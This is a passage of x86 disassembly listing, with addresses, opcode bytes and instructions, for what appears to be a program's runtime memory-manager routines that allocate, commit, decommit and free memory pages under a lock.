  4016a0:	8b 00                	mov    (%eax),%eax
  4016a2:	89 44 24 04          	mov    %eax,0x4(%esp)
  4016a6:	8b 06                	mov    (%esi),%eax
  4016a8:	8b 58 08             	mov    0x8(%eax),%ebx
  4016ab:	3b 5c 24 10          	cmp    0x10(%esp),%ebx
  4016af:	72 52                	jb     0x401703
  4016b1:	8b c3                	mov    %ebx,%eax
  4016b3:	8b 16                	mov    (%esi),%edx
  4016b5:	03 42 0c             	add    0xc(%edx),%eax
  4016b8:	3b 44 24 14          	cmp    0x14(%esp),%eax
  4016bc:	77 45                	ja     0x401703
  4016be:	3b 5c 24 08          	cmp    0x8(%esp),%ebx
  4016c2:	73 04                	jae    0x4016c8
  4016c4:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  4016c8:	8b 06                	mov    (%esi),%eax
  4016ca:	8b 68 08             	mov    0x8(%eax),%ebp
  4016cd:	8b 06                	mov    (%esi),%eax
  4016cf:	03 68 0c             	add    0xc(%eax),%ebp
  4016d2:	3b 6c 24 0c          	cmp    0xc(%esp),%ebp
  4016d6:	76 04                	jbe    0x4016dc
  4016d8:	89 6c 24 0c          	mov    %ebp,0xc(%esp)
  4016dc:	68 00 80 00 00       	push   $0x8000
  4016e1:	6a 00                	push   $0x0
  4016e3:	8b 06                	mov    (%esi),%eax
  4016e5:	8b 40 08             	mov    0x8(%eax),%eax
  4016e8:	50                   	push   %eax
  4016e9:	e8 16 fc ff ff       	call   0x401304
  4016ee:	85 c0                	test   %eax,%eax
  4016f0:	75 0a                	jne    0x4016fc
  4016f2:	c7 05 c0 d5 41 00 01 	movl   $0x1,0x41d5c0
  4016f9:	00 00 00 
  4016fc:	8b 06                	mov    (%esi),%eax
  4016fe:	e8 11 fd ff ff       	call   0x401414
  401703:	8b 44 24 04          	mov    0x4(%esp),%eax
  401707:	89 06                	mov    %eax,(%esi)
  401709:	b8 e4 d5 41 00       	mov    $0x41d5e4,%eax
  40170e:	3b 06                	cmp    (%esi),%eax
  401710:	75 8c                	jne    0x40169e
  401712:	33 c0                	xor    %eax,%eax
  401714:	89 07                	mov    %eax,(%edi)
  401716:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  40171b:	74 11                	je     0x40172e
  40171d:	8b 44 24 08          	mov    0x8(%esp),%eax
  401721:	89 07                	mov    %eax,(%edi)
  401723:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401727:	2b 44 24 08          	sub    0x8(%esp),%eax
  40172b:	89 47 04             	mov    %eax,0x4(%edi)
  40172e:	83 c4 18             	add    $0x18,%esp
  401731:	5d                   	pop    %ebp
  401732:	5f                   	pop    %edi
  401733:	5e                   	pop    %esi
  401734:	5b                   	pop    %ebx
  401735:	c3                   	ret
  401736:	8b c0                	mov    %eax,%eax
  401738:	53                   	push   %ebx
  401739:	56                   	push   %esi
  40173a:	57                   	push   %edi
  40173b:	55                   	push   %ebp
  40173c:	83 c4 e8             	add    $0xffffffe8,%esp
  40173f:	8b d9                	mov    %ecx,%ebx
  401741:	89 14 24             	mov    %edx,(%esp)
  401744:	8d 74 24 08          	lea    0x8(%esp),%esi
  401748:	8d 7c 24 04          	lea    0x4(%esp),%edi
  40174c:	8d 6c 24 0c          	lea    0xc(%esp),%ebp
  401750:	8b d0                	mov    %eax,%edx
  401752:	8b ca                	mov    %edx,%ecx
  401754:	81 e1 00 f0 ff ff    	and    $0xfffff000,%ecx
  40175a:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  40175e:	03 14 24             	add    (%esp),%edx
  401761:	81 c2 ff 0f 00 00    	add    $0xfff,%edx
  401767:	81 e2 00 f0 ff ff    	and    $0xfffff000,%edx
  40176d:	89 54 24 14          	mov    %edx,0x14(%esp)
  401771:	8b 44 24 10          	mov    0x10(%esp),%eax
  401775:	89 03                	mov    %eax,(%ebx)
  401777:	8b 44 24 14          	mov    0x14(%esp),%eax
  40177b:	2b 44 24 10          	sub    0x10(%esp),%eax
  40177f:	89 43 04             	mov    %eax,0x4(%ebx)
  401782:	a1 e4 d5 41 00       	mov    0x41d5e4,%eax
  401787:	89 07                	mov    %eax,(%edi)
  401789:	eb 5b                	jmp    0x4017e6
  40178b:	8b 07                	mov    (%edi),%eax
  40178d:	8b 40 08             	mov    0x8(%eax),%eax
  401790:	89 06                	mov    %eax,(%esi)
  401792:	8b 07                	mov    (%edi),%eax
  401794:	8b 40 0c             	mov    0xc(%eax),%eax
  401797:	03 06                	add    (%esi),%eax
  401799:	89 45 00             	mov    %eax,0x0(%ebp)
  40179c:	8b 06                	mov    (%esi),%eax
  40179e:	3b 44 24 10          	cmp    0x10(%esp),%eax
  4017a2:	73 06                	jae    0x4017aa
  4017a4:	8b 44 24 10          	mov    0x10(%esp),%eax
  4017a8:	89 06                	mov    %eax,(%esi)
  4017aa:	8b 45 00             	mov    0x0(%ebp),%eax
  4017ad:	3b 44 24 14          	cmp    0x14(%esp),%eax
  4017b1:	76 07                	jbe    0x4017ba
  4017b3:	8b 44 24 14          	mov    0x14(%esp),%eax
  4017b7:	89 45 00             	mov    %eax,0x0(%ebp)
  4017ba:	8b 06                	mov    (%esi),%eax
  4017bc:	3b 45 00             	cmp    0x0(%ebp),%eax
  4017bf:	73 1f                	jae    0x4017e0
  4017c1:	6a 04                	push   $0x4
  4017c3:	68 00 10 00 00       	push   $0x1000
  4017c8:	8b 45 00             	mov    0x0(%ebp),%eax
  4017cb:	2b 06                	sub    (%esi),%eax
  4017cd:	50                   	push   %eax
  4017ce:	8b 06                	mov    (%esi),%eax
  4017d0:	50                   	push   %eax
  4017d1:	e8 26 fb ff ff       	call   0x4012fc
  4017d6:	85 c0                	test   %eax,%eax
  4017d8:	75 06                	jne    0x4017e0
  4017da:	33 c0                	xor    %eax,%eax
  4017dc:	89 03                	mov    %eax,(%ebx)
  4017de:	eb 0f                	jmp    0x4017ef
  4017e0:	8b 07                	mov    (%edi),%eax
  4017e2:	8b 00                	mov    (%eax),%eax
  4017e4:	89 07                	mov    %eax,(%edi)
  4017e6:	b8 e4 d5 41 00       	mov    $0x41d5e4,%eax
  4017eb:	3b 07                	cmp    (%edi),%eax
  4017ed:	75 9c                	jne    0x40178b
  4017ef:	83 c4 18             	add    $0x18,%esp
  4017f2:	5d                   	pop    %ebp
  4017f3:	5f                   	pop    %edi
  4017f4:	5e                   	pop    %esi
  4017f5:	5b                   	pop    %ebx
  4017f6:	c3                   	ret
  4017f7:	90                   	nop
  4017f8:	53                   	push   %ebx
  4017f9:	56                   	push   %esi
  4017fa:	57                   	push   %edi
  4017fb:	55                   	push   %ebp
  4017fc:	83 c4 e8             	add    $0xffffffe8,%esp
  4017ff:	89 14 24             	mov    %edx,(%esp)
  401802:	8d 74 24 08          	lea    0x8(%esp),%esi
  401806:	8d 7c 24 04          	lea    0x4(%esp),%edi
  40180a:	8d 5c 24 0c          	lea    0xc(%esp),%ebx
  40180e:	8b d0                	mov    %eax,%edx
  401810:	8b ea                	mov    %edx,%ebp
  401812:	81 c5 ff 0f 00 00    	add    $0xfff,%ebp
  401818:	81 e5 00 f0 ff ff    	and    $0xfffff000,%ebp
  40181e:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  401822:	03 14 24             	add    (%esp),%edx
  401825:	81 e2 00 f0 ff ff    	and    $0xfffff000,%edx
  40182b:	89 54 24 14          	mov    %edx,0x14(%esp)
  40182f:	8b 44 24 10          	mov    0x10(%esp),%eax
  401833:	89 01                	mov    %eax,(%ecx)
  401835:	8b 44 24 14          	mov    0x14(%esp),%eax
  401839:	2b 44 24 10          	sub    0x10(%esp),%eax
  40183d:	89 41 04             	mov    %eax,0x4(%ecx)
  401840:	a1 e4 d5 41 00       	mov    0x41d5e4,%eax
  401845:	89 07                	mov    %eax,(%edi)
  401847:	eb 58                	jmp    0x4018a1
  401849:	8b 07                	mov    (%edi),%eax
  40184b:	8b 40 08             	mov    0x8(%eax),%eax
  40184e:	89 06                	mov    %eax,(%esi)
  401850:	8b 07                	mov    (%edi),%eax
  401852:	8b 40 0c             	mov    0xc(%eax),%eax
  401855:	03 06                	add    (%esi),%eax
  401857:	89 03                	mov    %eax,(%ebx)
  401859:	8b 06                	mov    (%esi),%eax
  40185b:	3b 44 24 10          	cmp    0x10(%esp),%eax
  40185f:	73 06                	jae    0x401867
  401861:	8b 44 24 10          	mov    0x10(%esp),%eax
  401865:	89 06                	mov    %eax,(%esi)
  401867:	8b 03                	mov    (%ebx),%eax
  401869:	3b 44 24 14          	cmp    0x14(%esp),%eax
  40186d:	76 06                	jbe    0x401875
  40186f:	8b 44 24 14          	mov    0x14(%esp),%eax
  401873:	89 03                	mov    %eax,(%ebx)
  401875:	8b 06                	mov    (%esi),%eax
  401877:	3b 03                	cmp    (%ebx),%eax
  401879:	73 20                	jae    0x40189b
  40187b:	68 00 40 00 00       	push   $0x4000
  401880:	8b 03                	mov    (%ebx),%eax
  401882:	2b 06                	sub    (%esi),%eax
  401884:	50                   	push   %eax
  401885:	8b 06                	mov    (%esi),%eax
  401887:	50                   	push   %eax
  401888:	e8 77 fa ff ff       	call   0x401304
  40188d:	85 c0                	test   %eax,%eax
  40188f:	75 0a                	jne    0x40189b
  401891:	c7 05 c0 d5 41 00 02 	movl   $0x2,0x41d5c0
  401898:	00 00 00 
  40189b:	8b 07                	mov    (%edi),%eax
  40189d:	8b 00                	mov    (%eax),%eax
  40189f:	89 07                	mov    %eax,(%edi)
  4018a1:	b8 e4 d5 41 00       	mov    $0x41d5e4,%eax
  4018a6:	3b 07                	cmp    (%edi),%eax
  4018a8:	75 9f                	jne    0x401849
  4018aa:	83 c4 18             	add    $0x18,%esp
  4018ad:	5d                   	pop    %ebp
  4018ae:	5f                   	pop    %edi
  4018af:	5e                   	pop    %esi
  4018b0:	5b                   	pop    %ebx
  4018b1:	c3                   	ret
  4018b2:	8b c0                	mov    %eax,%eax
  4018b4:	53                   	push   %ebx
  4018b5:	56                   	push   %esi
  4018b6:	57                   	push   %edi
  4018b7:	55                   	push   %ebp
  4018b8:	83 c4 f4             	add    $0xfffffff4,%esp
  4018bb:	8b da                	mov    %edx,%ebx
  4018bd:	8b f0                	mov    %eax,%esi
  4018bf:	8b fc                	mov    %esp,%edi
  4018c1:	bd f4 d5 41 00       	mov    $0x41d5f4,%ebp
  4018c6:	81 c6 ff 3f 00 00    	add    $0x3fff,%esi
  4018cc:	81 e6 00 c0 ff ff    	and    $0xffffc000,%esi
  4018d2:	8b 45 00             	mov    0x0(%ebp),%eax
  4018d5:	89 07                	mov    %eax,(%edi)
  4018d7:	eb 41                	jmp    0x40191a
  4018d9:	8b 07                	mov    (%edi),%eax
  4018db:	3b 70 0c             	cmp    0xc(%eax),%esi
  4018de:	7f 34                	jg     0x401914
  4018e0:	8b cb                	mov    %ebx,%ecx
  4018e2:	8b 07                	mov    (%edi),%eax
  4018e4:	8b 40 08             	mov    0x8(%eax),%eax
  4018e7:	8b d6                	mov    %esi,%edx
  4018e9:	e8 4a fe ff ff       	call   0x401738
  4018ee:	83 3b 00             	cmpl   $0x0,(%ebx)
  4018f1:	74 5f                	je     0x401952
  4018f3:	8b 43 04             	mov    0x4(%ebx),%eax
  4018f6:	8b 17                	mov    (%edi),%edx
  4018f8:	01 42 08             	add    %eax,0x8(%edx)
  4018fb:	8b 43 04             	mov    0x4(%ebx),%eax
  4018fe:	8b 17                	mov    (%edi),%edx
  401900:	29 42 0c             	sub    %eax,0xc(%edx)
  401903:	8b 07                	mov    (%edi),%eax
  401905:	83 78 0c 00          	cmpl   $0x0,0xc(%eax)
  401909:	75 47                	jne    0x401952
  40190b:	8b 07                	mov    (%edi),%eax
  40190d:	e8 02 fb ff ff       	call   0x401414
  401912:	eb 3e                	jmp    0x401952
  401914:	8b 07                	mov    (%edi),%eax
  401916:	8b 00                	mov    (%eax),%eax
  401918:	89 07                	mov    %eax,(%edi)
  40191a:	3b 2f                	cmp    (%edi),%ebp
  40191c:	75 bb                	jne    0x4018d9
  40191e:	8b d3                	mov    %ebx,%edx
  401920:	8b c6                	mov    %esi,%eax
  401922:	e8 6d fc ff ff       	call   0x401594
  401927:	83 3b 00             	cmpl   $0x0,(%ebx)
  40192a:	74 26                	je     0x401952
  40192c:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  401930:	8b d3                	mov    %ebx,%edx
  401932:	8b c5                	mov    %ebp,%eax
  401934:	e8 0f fb ff ff       	call   0x401448
  401939:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  40193e:	75 92                	jne    0x4018d2
  401940:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  401944:	8b 53 04             	mov    0x4(%ebx),%edx
  401947:	8b 03                	mov    (%ebx),%eax
  401949:	e8 22 fd ff ff       	call   0x401670
  40194e:	33 c0                	xor    %eax,%eax
  401950:	89 03                	mov    %eax,(%ebx)
  401952:	83 c4 0c             	add    $0xc,%esp
  401955:	5d                   	pop    %ebp
  401956:	5f                   	pop    %edi
  401957:	5e                   	pop    %esi
  401958:	5b                   	pop    %ebx
  401959:	c3                   	ret
  40195a:	8b c0                	mov    %eax,%eax
  40195c:	53                   	push   %ebx
  40195d:	56                   	push   %esi
  40195e:	57                   	push   %edi
  40195f:	55                   	push   %ebp
  401960:	83 c4 e8             	add    $0xffffffe8,%esp
  401963:	89 0c 24             	mov    %ecx,(%esp)
  401966:	8b fa                	mov    %edx,%edi
  401968:	8b d8                	mov    %eax,%ebx
  40196a:	8d 74 24 04          	lea    0x4(%esp),%esi
  40196e:	bd f4 d5 41 00       	mov    $0x41d5f4,%ebp
  401973:	81 c7 ff 3f 00 00    	add    $0x3fff,%edi
  401979:	81 e7 00 c0 ff ff    	and    $0xffffc000,%edi
  40197f:	8b 45 00             	mov    0x0(%ebp),%eax
  401982:	89 06                	mov    %eax,(%esi)
  401984:	eb 06                	jmp    0x40198c
  401986:	8b 06                	mov    (%esi),%eax
  401988:	8b 00                	mov    (%eax),%eax
  40198a:	89 06                	mov    %eax,(%esi)
  40198c:	3b 2e                	cmp    (%esi),%ebp
  40198e:	74 07                	je     0x401997
  401990:	8b 06                	mov    (%esi),%eax
  401992:	3b 58 08             	cmp    0x8(%eax),%ebx
  401995:	75 ef                	jne    0x401986
  401997:	8b 06                	mov    (%esi),%eax
  401999:	3b 58 08             	cmp    0x8(%eax),%ebx
  40199c:	75 5f                	jne    0x4019fd
  40199e:	8b 06                	mov    (%esi),%eax
  4019a0:	3b 78 0c             	cmp    0xc(%eax),%edi
  4019a3:	0f 8e 9c 00 00 00    	jle    0x401a45
  4019a9:	8b 06                	mov    (%esi),%eax
  4019ab:	8b d7                	mov    %edi,%edx
  4019ad:	2b 50 0c             	sub    0xc(%eax),%edx
  4019b0:	8b 06                	mov    (%esi),%eax
  4019b2:	8b 40 08             	mov    0x8(%eax),%eax
  4019b5:	8b 0e                	mov    (%esi),%ecx
  4019b7:	03 41 0c             	add    0xc(%ecx),%eax
  4019ba:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  4019be:	e8 35 fc ff ff       	call   0x4015f8
  4019c3:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  4019c8:	74 33                	je     0x4019fd
  4019ca:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4019ce:	8d 54 24 08          	lea    0x8(%esp),%edx
  4019d2:	8b c5                	mov    %ebp,%eax
  4019d4:	e8 6f fa ff ff       	call   0x401448
  4019d9:	83 7c 24 10 00       	cmpl   $0x0,0x10(%esp)
  4019de:	75 9f                	jne    0x40197f
  4019e0:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4019e4:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4019e8:	8b 44 24 08          	mov    0x8(%esp),%eax
  4019ec:	e8 7f fc ff ff       	call   0x401670
  4019f1:	8b 04 24             	mov    (%esp),%eax
  4019f4:	33 d2                	xor    %edx,%edx
  4019f6:	89 10                	mov    %edx,(%eax)
  4019f8:	e9 9a 00 00 00       	jmp    0x401a97
  4019fd:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401a01:	8b d7                	mov    %edi,%edx
  401a03:	8b c3                	mov    %ebx,%eax
  401a05:	e8 ee fb ff ff       	call   0x4015f8
  401a0a:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  401a0f:	74 34                	je     0x401a45
  401a11:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  401a15:	8d 54 24 08          	lea    0x8(%esp),%edx
  401a19:	8b c5                	mov    %ebp,%eax
  401a1b:	e8 28 fa ff ff       	call   0x401448
  401a20:	83 7c 24 10 00       	cmpl   $0x0,0x10(%esp)
  401a25:	0f 85 54 ff ff ff    	jne    0x40197f
  401a2b:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  401a2f:	8b 54 24 0c          	mov    0xc(%esp),%edx
  401a33:	8b 44 24 08          	mov    0x8(%esp),%eax
  401a37:	e8 34 fc ff ff       	call   0x401670
  401a3c:	8b 04 24             	mov    (%esp),%eax
  401a3f:	33 d2                	xor    %edx,%edx
  401a41:	89 10                	mov    %edx,(%eax)
  401a43:	eb 52                	jmp    0x401a97
  401a45:	8b 06                	mov    (%esi),%eax
  401a47:	8b 68 08             	mov    0x8(%eax),%ebp
  401a4a:	3b dd                	cmp    %ebp,%ebx
  401a4c:	75 42                	jne    0x401a90
  401a4e:	8b 06                	mov    (%esi),%eax
  401a50:	3b 78 0c             	cmp    0xc(%eax),%edi
  401a53:	7f 3b                	jg     0x401a90
  401a55:	8b 0c 24             	mov    (%esp),%ecx
  401a58:	8b c5                	mov    %ebp,%eax
  401a5a:	8b d7                	mov    %edi,%edx
  401a5c:	e8 d7 fc ff ff       	call   0x401738
  401a61:	8b 04 24             	mov    (%esp),%eax
  401a64:	83 38 00             	cmpl   $0x0,(%eax)
  401a67:	74 2e                	je     0x401a97
  401a69:	8b 04 24             	mov    (%esp),%eax
  401a6c:	8b 40 04             	mov    0x4(%eax),%eax
  401a6f:	8b 16                	mov    (%esi),%edx
  401a71:	01 42 08             	add    %eax,0x8(%edx)
  401a74:	8b 04 24             	mov    (%esp),%eax
  401a77:	8b 40 04             	mov    0x4(%eax),%eax
  401a7a:	8b 16                	mov    (%esi),%edx
  401a7c:	29 42 0c             	sub    %eax,0xc(%edx)
  401a7f:	8b 06                	mov    (%esi),%eax
  401a81:	83 78 0c 00          	cmpl   $0x0,0xc(%eax)
  401a85:	75 10                	jne    0x401a97
  401a87:	8b 06                	mov    (%esi),%eax
  401a89:	e8 86 f9 ff ff       	call   0x401414
  401a8e:	eb 07                	jmp    0x401a97
  401a90:	8b 04 24             	mov    (%esp),%eax
  401a93:	33 d2                	xor    %edx,%edx
  401a95:	89 10                	mov    %edx,(%eax)
  401a97:	83 c4 18             	add    $0x18,%esp
  401a9a:	5d                   	pop    %ebp
  401a9b:	5f                   	pop    %edi
  401a9c:	5e                   	pop    %esi
  401a9d:	5b                   	pop    %ebx
  401a9e:	c3                   	ret
  401a9f:	90                   	nop
  401aa0:	53                   	push   %ebx
  401aa1:	83 c4 e8             	add    $0xffffffe8,%esp
  401aa4:	8b d9                	mov    %ecx,%ebx
  401aa6:	8d 88 ff 3f 00 00    	lea    0x3fff(%eax),%ecx
  401aac:	81 e1 00 c0 ff ff    	and    $0xffffc000,%ecx
  401ab2:	89 0c 24             	mov    %ecx,(%esp)
  401ab5:	03 d0                	add    %eax,%edx
  401ab7:	81 e2 00 c0 ff ff    	and    $0xffffc000,%edx
  401abd:	89 54 24 04          	mov    %edx,0x4(%esp)
  401ac1:	8b 44 24 04          	mov    0x4(%esp),%eax
  401ac5:	3b 04 24             	cmp    (%esp),%eax
  401ac8:	76 5f                	jbe    0x401b29
  401aca:	8b cb                	mov    %ebx,%ecx
  401acc:	8b 54 24 04          	mov    0x4(%esp),%edx
  401ad0:	2b 14 24             	sub    (%esp),%edx
  401ad3:	8b 04 24             	mov    (%esp),%eax
  401ad6:	e8 1d fd ff ff       	call   0x4017f8
  401adb:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401adf:	8b d3                	mov    %ebx,%edx
  401ae1:	b8 f4 d5 41 00       	mov    $0x41d5f4,%eax
  401ae6:	e8 5d f9 ff ff       	call   0x401448
  401aeb:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  401aef:	85 db                	test   %ebx,%ebx
  401af1:	74 1f                	je     0x401b12
  401af3:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  401af7:	8b 54 24 0c          	mov    0xc(%esp),%edx
  401afb:	8b c3                	mov    %ebx,%eax
  401afd:	e8 6e fb ff ff       	call   0x401670
  401b02:	8b 44 24 10          	mov    0x10(%esp),%eax
  401b06:	89 44 24 08          	mov    %eax,0x8(%esp)
  401b0a:	8b 44 24 14          	mov    0x14(%esp),%eax
  401b0e:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401b12:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  401b17:	74 14                	je     0x401b2d
  401b19:	8d 54 24 08          	lea    0x8(%esp),%edx
  401b1d:	b8 f4 d5 41 00       	mov    $0x41d5f4,%eax
  401b22:	e8 a9 f9 ff ff       	call   0x4014d0
  401b27:	eb 04                	jmp    0x401b2d
  401b29:	33 c0                	xor    %eax,%eax
  401b2b:	89 03                	mov    %eax,(%ebx)
  401b2d:	83 c4 18             	add    $0x18,%esp
  401b30:	5b                   	pop    %ebx
  401b31:	c3                   	ret
  401b32:	8b c0                	mov    %eax,%eax
  401b34:	55                   	push   %ebp
  401b35:	8b ec                	mov    %esp,%ebp
  401b37:	51                   	push   %ecx
  401b38:	33 d2                	xor    %edx,%edx
  401b3a:	55                   	push   %ebp
  401b3b:	68 fc 1b 40 00       	push   $0x401bfc
  401b40:	64 ff 32             	push   %fs:(%edx)
  401b43:	64 89 22             	mov    %esp,%fs:(%edx)
  401b46:	68 c4 d5 41 00       	push   $0x41d5c4
  401b4b:	e8 bc f7 ff ff       	call   0x40130c
  401b50:	80 3d 45 d0 41 00 00 	cmpb   $0x0,0x41d045
  401b57:	74 0a                	je     0x401b63
  401b59:	68 c4 d5 41 00       	push   $0x41d5c4
  401b5e:	e8 b1 f7 ff ff       	call   0x401314
  401b63:	b8 e4 d5 41 00       	mov    $0x41d5e4,%eax
  401b68:	e8 43 f8 ff ff       	call   0x4013b0
  401b6d:	b8 f4 d5 41 00       	mov    $0x41d5f4,%eax
  401b72:	e8 39 f8 ff ff       	call   0x4013b0
  401b77:	b8 20 d6 41 00       	mov    $0x41d620,%eax
  401b7c:	e8 2f f8 ff ff       	call   0x4013b0
  401b81:	68 f8 0f 00 00       	push   $0xff8
  401b86:	6a 00                	push   $0x0
  401b88:	e8 5f f7 ff ff       	call   0x4012ec
  401b8d:	a3 1c d6 41 00       	mov    %eax,0x41d61c
  401b92:	83 3d 1c d6 41 00 00 	cmpl   $0x0,0x41d61c
  401b99:	74 40                	je     0x401bdb
  401b9b:	b8 03 00 00 00       	mov    $0x3,%eax
  401ba0:	8b 15 1c d6 41 00    	mov    0x41d61c,%edx
  401ba6:	33 c9                	xor    %ecx,%ecx
  401ba8:	89 4c 82 f4          	mov    %ecx,-0xc(%edx,%eax,4)
  401bac:	40                   	inc    %eax
  401bad:	3d 01 04 00 00       	cmp    $0x401,%eax
  401bb2:	75 ec                	jne    0x401ba0
  401bb4:	c7 45 fc 04 d6 41 00 	movl   $0x41d604,-0x4(%ebp)
  401bbb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401bbe:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401bc1:	89 50 04             	mov    %edx,0x4(%eax)
  401bc4:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401bc7:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401bca:	89 10                	mov    %edx,(%eax)
  401bcc:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401bcf:	a3 10 d6 41 00       	mov    %eax,0x41d610
  401bd4:	c6 05 bc d5 41 00 01 	movb   $0x1,0x41d5bc
  401bdb:	33 c0                	xor    %eax,%eax
  401bdd:	5a                   	pop    %edx
  401bde:	59                   	pop    %ecx
  401bdf:	59                   	pop    %ecx
  401be0:	64 89 10             	mov    %edx,%fs:(%eax)
  401be3:	68 03 1c 40 00       	push   $0x401c03
  401be8:	80 3d 45 d0 41 00 00 	cmpb   $0x0,0x41d045
  401bef:	74 0a                	je     0x401bfb
  401bf1:	68 c4 d5 41 00       	push   $0x41d5c4
  401bf6:	e8 21 f7 ff ff       	call   0x40131c
  401bfb:	c3                   	ret
  401bfc:	e9 93 28 00 00       	jmp    0x404494
  401c01:	eb e5                	jmp    0x401be8
  401c03:	a0 bc d5 41 00       	mov    0x41d5bc,%al
  401c08:	59                   	pop    %ecx
  401c09:	5d                   	pop    %ebp
  401c0a:	c3                   	ret
  401c0b:	90                   	nop
  401c0c:	55                   	push   %ebp
  401c0d:	8b ec                	mov    %esp,%ebp
  401c0f:	83 c4 f8             	add    $0xfffffff8,%esp
  401c12:	80 3d bc d5 41 00 00 	cmpb   $0x0,0x41d5bc
  401c19:	0f 84 e8 00 00 00    	je     0x401d07
  401c1f:	33 c0                	xor    %eax,%eax
  401c21:	55                   	push   %ebp
  401c22:	68 00 1d 40 00       	push   $0x401d00
  401c27:	64 ff 30             	push   %fs:(%eax)
  401c2a:	64 89 20             	mov    %esp,%fs:(%eax)
  401c2d:	80 3d 45 d0 41 00 00 	cmpb   $0x0,0x41d045
  401c34:	74 0a                	je     0x401c40
  401c36:	68 c4 d5 41 00       	push   $0x41d5c4
  401c3b:	e8 d4 f6 ff ff       	call   0x401314
  401c40:	c6 05 bc d5 41 00 00 	movb   $0x0,0x41d5bc
  401c47:	a1 1c d6 41 00       	mov    0x41d61c,%eax
  401c4c:	50                   	push   %eax
  401c4d:	e8 a2 f6 ff ff       	call   0x4012f4
  401c52:	33 c0                	xor    %eax,%eax
  401c54:	a3 1c d6 41 00       	mov    %eax,0x41d61c
  401c59:	a1 e4 d5 41 00       	mov    0x41d5e4,%eax
  401c5e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401c61:	eb 1b                	jmp    0x401c7e
  401c63:	68 00 80 00 00       	push   $0x8000
  401c68:	6a 00                	push   $0x0
  401c6a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401c6d:	8b 40 08             	mov    0x8(%eax),%eax
  401c70:	50                   	push   %eax
  401c71:	e8 8e f6 ff ff       	call   0x401304
  401c76:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401c79:	8b 00                	mov    (%eax),%eax
  401c7b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401c7e:	b8 e4 d5 41 00       	mov    $0x41d5e4,%eax
  401c83:	3b 45 f8             	cmp    -0x8(%ebp),%eax
  401c86:	75 db                	jne    0x401c63
  401c88:	b8 e4 d5 41 00       	mov    $0x41d5e4,%eax
  401c8d:	e8 1e f7 ff ff       	call   0x4013b0
  401c92:	b8 f4 d5 41 00       	mov    $0x41d5f4,%eax
  401c97:	e8 14 f7 ff ff       	call   0x4013b0
  401c9c:	b8 20 d6 41 00       	mov    $0x41d620,%eax
  401ca1:	e8 0a f7 ff ff       	call   0x4013b0
  401ca6:	a1 dc d5 41 00       	mov    0x41d5dc,%eax
  401cab:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401cae:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  401cb2:	74 21                	je     0x401cd5
  401cb4:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401cb7:	8b 00                	mov    (%eax),%eax
  401cb9:	a3 dc d5 41 00       	mov    %eax,0x41d5dc
  401cbe:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401cc1:	50                   	push   %eax
  401cc2:	e8 2d f6 ff ff       	call   0x4012f4
  401cc7:	a1 dc d5 41 00       	mov    0x41d5dc,%eax
  401ccc:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401ccf:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  401cd3:	75 df                	jne    0x401cb4
  401cd5:	33 c0                	xor    %eax,%eax
  401cd7:	5a                   	pop    %edx
  401cd8:	59                   	pop    %ecx
  401cd9:	59                   	pop    %ecx
  401cda:	64 89 10             	mov    %edx,%fs:(%eax)
  401cdd:	68 07 1d 40 00       	push   $0x401d07
  401ce2:	80 3d 45 d0 41 00 00 	cmpb   $0x0,0x41d045
  401ce9:	74 0a                	je     0x401cf5
  401ceb:	68 c4 d5 41 00       	push   $0x41d5c4
  401cf0:	e8 27 f6 ff ff       	call   0x40131c
  401cf5:	68 c4 d5 41 00       	push   $0x41d5c4
  401cfa:	e8 25 f6 ff ff       	call   0x401324
  401cff:	c3                   	ret
  401d00:	e9 8f 27 00 00       	jmp    0x404494
  401d05:	eb db                	jmp    0x401ce2
  401d07:	59                   	pop    %ecx
  401d08:	59                   	pop    %ecx
  401d09:	5d                   	pop    %ebp
  401d0a:	c3                   	ret
  401d0b:	90                   	nop
  401d0c:	53                   	push   %ebx
  401d0d:	83 c4 f8             	add    $0xfffffff8,%esp
  401d10:	3b 05 10 d6 41 00    	cmp    0x41d610,%eax
  401d16:	75 09                	jne    0x401d21
  401d18:	8b 50 04             	mov    0x4(%eax),%edx
  401d1b:	89 15 10 d6 41 00    	mov    %edx,0x41d610
  401d21:	8b 50 04             	mov    0x4(%eax),%edx
  401d24:	89 14 24             	mov    %edx,(%esp)
  401d27:	8b 50 08             	mov    0x8(%eax),%edx
  401d2a:	81 fa 00 10 00 00    	cmp    $0x1000,%edx
  401d30:	7f 4e                	jg     0x401d80
  401d32:	3b 04 24             	cmp    (%esp),%eax
  401d35:	75 17                	jne    0x401d4e
  401d37:	85 d2                	test   %edx,%edx
  401d39:	79 03                	jns    0x401d3e
  401d3b:	83 c2 03             	add    $0x3,%edx
